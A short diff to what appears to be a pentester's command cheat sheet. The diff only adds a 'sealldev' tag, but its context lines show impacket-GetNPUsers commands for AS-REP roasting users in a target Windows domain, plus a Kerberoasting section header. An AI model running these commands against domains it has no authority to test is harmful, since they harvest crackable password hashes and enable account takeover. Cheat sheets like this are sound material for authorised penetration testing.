@@ -1,4 +1,4 @@
-% windows, impacket, getnpusers, asrep, asrep roast, as-rep, as-rep roast
+% sealldev, windows, impacket, getnpusers, asrep, asrep roast, as-rep, as-rep roast
 @ windows-variables
 
 # Scan for ASREP/AS-REP-roastable users from a list in a target domain
@@ -7,7 +7,7 @@ impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast -users
 # Scan for if a user is ASREP/AS-REP-roastable in a target domain
 impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast '<domain>/<username>' 
 
-% windows, impacket, getuserspns, kerberoast, kerberoastable
+% sealldev, windows, impacket, getuserspns, kerberoast, kerberoastable
 @ windows-variables
 
 # Scan for Kerberoastable users in a target domain with a password
